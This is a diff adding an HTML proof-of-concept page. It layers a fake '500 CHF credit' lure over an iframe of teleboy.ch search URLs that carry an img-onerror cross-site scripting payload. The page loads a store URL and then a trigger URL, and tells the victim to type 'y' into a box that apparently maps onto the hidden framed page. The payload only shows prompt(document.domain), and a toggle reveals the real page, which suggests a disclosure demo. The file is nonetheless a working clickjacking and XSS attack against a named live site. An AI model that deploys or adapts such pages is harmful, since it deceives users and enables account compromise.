@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Claim Your 500 CHF Credit</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(243, 243, 243, 1);
+            z-index: 4;
+            pointer-events: none;
+        }
+
+        h1, #message, #fake-input {
+            pointer-events: none;
+        }
+
+        #title {
+            position: absolute;
+            top: 35%;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #27ae60;
+            font-size: 28px;
+            z-index: 5;
+        }
+
+        #message {
+            position: absolute;
+            top: 61px;
+            left: 80px;
+            font-size: 18px;
+            z-index: 5;
+            display: none;
+        }
+
+        #fake-input {
+            position: absolute;
+            top: 75px;
+            left: 550px;
+            width: 30px;
+            height: 25px;
+            border: 2px solid #27ae60;
+            font-size: 18px;
+            text-align: center;
+            border-radius: 4px;
+            z-index: 5;
+            background: white;
+            box-shadow: 0 0 5px rgba(0,0,0,0.2);
+            line-height: 25px;
+            display: none;
+        }
+
+        #loading-text {
+            position: absolute;
+            top: 40%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 18px;
+            color: #555;
+            z-index: 5;
+        }
+
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            z-index: 1;
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        #toggleView {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background-color: #34495e;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="overlay">
+        <h1 id="title">🎉 Claim Your 500 CHF Credit</h1>
+        <p id="loading-text">Preparing your redeem code, please wait...</p>
+        <p id="message">To activate your bonus, simply type <strong>y</strong> in the green box  =></p>
+        <div id="fake-input"></div>
+    </div>
+
+    <iframe id="victim-frame" src="about:blank"></iframe>
+
+    <button id="toggleView" onclick="toggleView()">Show Real Page</button>
+
+    <script>
+        const iframe = document.getElementById('victim-frame');
+        const overlay = document.getElementById('overlay');
+        const toggleBtn = document.getElementById('toggleView');
+
+        const loadingText = document.getElementById('loading-text');
+        const message = document.getElementById('message');
+        const fakeInput = document.getElementById('fake-input');
+
+        const payloadStore = "https://www.teleboy.ch/en/search?query=name:%3Cimg%20Src%3DOnXSS%20OnError%3Dprompt(document.domain)%3Ewxy";
+        const payloadTrigger = "https://www.teleboy.ch/en/search?query=name:%3Cimg%20Src%3DOnXSS%20OnError%3Dprompt(document.domain)%3Ewx";
+
+        let step = 0;
+
+        iframe.onload = function () {
+            if (step === 0) {
+                step++;
+                setTimeout(() => {
+                    iframe.src = payloadTrigger;
+                }, 100); // Wait enough to ensure the payloadStore loads properly
+            } else if (step === 1) {
+                step++;
+
+                // Second iframe (payloadTrigger) loaded — now reveal final message
+                loadingText.style.display = "none";
+                message.style.display = "block";
+                fakeInput.style.display = "block";
+            }
+        };
+
+        let isFakeVisible = true;
+
+        function toggleView() {
+            if (isFakeVisible) {
+                overlay.style.display = 'none';
+                iframe.style.opacity = '1';
+                toggleBtn.innerText = "Back to Fake Offer";
+            } else {
+                overlay.style.display = 'block';
+                iframe.style.opacity = '1';
+                toggleBtn.innerText = "Show Real Page";
+            }
+            isFakeVisible = !isFakeVisible;
+        }
+
+        // Trigger first load
+        iframe.src = payloadStore;
+    </script>
+
+</body>
+</html>
